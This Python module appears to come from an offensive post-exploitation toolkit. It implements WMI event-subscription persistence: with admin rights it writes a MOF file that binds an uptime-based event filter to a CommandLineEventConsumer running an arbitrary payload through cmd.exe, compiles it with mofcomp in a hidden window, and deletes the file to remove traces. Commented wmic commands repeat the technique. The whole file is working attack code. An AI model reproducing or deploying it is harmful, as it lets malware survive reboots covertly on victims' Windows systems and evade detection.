import os
import wmi
import time
import tempfile
import ctypes
from core.prints import *

wmi = wmi.WMI()

#wmic /namespace:'\\root\subscription' PATH __EventFilter CREATE Name='wpEventFilter', QueryLanguage='WQL', Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 360'
#wmic /namespace:'\\root\subscription' PATH CommandLineEventConsumer CREATE Name='wpEventConsumer', CommandLineTemplate=''
#wmic /namespace:'\\root\subscription' PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name=\'wpEventFilter\'', Consumer='CommandLineEventConsumer.Name=\'wpEventConsumer\''

def persist_wmi(payload): 
	mof_template = """#PRAGMA AUTORECOVER
#PRAGMA NAMESPACE ("\\\\root\\\subscription")

instance of CommandLineEventConsumer as $Cons
{
	Name = "wpEventConsumer";    
	RunInteractively=false;
	CommandLineTemplate="cmd.exe /c """+os.path.join(payload)+"""";
};

instance of __EventFilter as $Filt
{
	Name = "wpEventFilter";
	Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 360";    
	QueryLanguage = "WQL";    
	EventNamespace = "root\\\cimv2";
};

instance of __FilterToConsumerBinding
{
	Filter = $Filt;
	Consumer = $Cons;
};"""

	if (ctypes.windll.shell32.IsUserAnAdmin() == True):
		print_info("Creating MOF file in: {}".format(os.path.join(tempfile.gettempdir(),"persist.mof")))

		try:
			mof_file = open(os.path.join(tempfile.gettempdir(),"persist.mof"),"w")
			mof_file.write(mof_template)
			mof_file.close()
		except Exception as error:
			print_error("Unable to write MOF file: {} to disk".format(os.path.join(tempfile.gettempdir(),"persist.mof")))
			return False
		else:
			print_success("Successfully created MOF file in: {}".format(os.path.join(tempfile.gettempdir(),"persist.mof")))

		time.sleep(5)

		if (os.path.isfile(os.path.join(tempfile.gettempdir(),"persist.mof")) == True):
			mofcomp = wmi.Win32_Process.Create(CommandLine="mofcomp.exe {}".format(os.path.join(tempfile.gettempdir(),"persist.mof")),ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
		
			if (mofcomp[1] == 0):
				print_success("Successfully compiled MOF file: {}, we should have persistence now".format(os.path.join(tempfile.gettempdir(),"persist.mof")))
			else:
				print_error("Unable to mofcomp to compile MOF file: {}".format(os.path.join(tempfile.gettempdir(),"persist.mof")))
				return False

			time.sleep(5)

			try:
				os.remove(os.path.join(tempfile.gettempdir(),"persist.mof"))
			except Exception as error:
				print_error("Unable to delete: {}".format(os.path.join(tempfile.gettempdir(),"persist.mof")))
				return False
			else:
				print_success("Successfully deleted MOF file: {}".format(os.path.join(tempfile.gettempdir(),"persist.mof")))
		else:
			print_error("Unable to locate MOF file on disk")
			return False
	else:
		print_error("Unable to compile MOF file: {} we are not elevated".format(os.path.join(tempfile.gettempdir(),"persist.mof")))
		return False
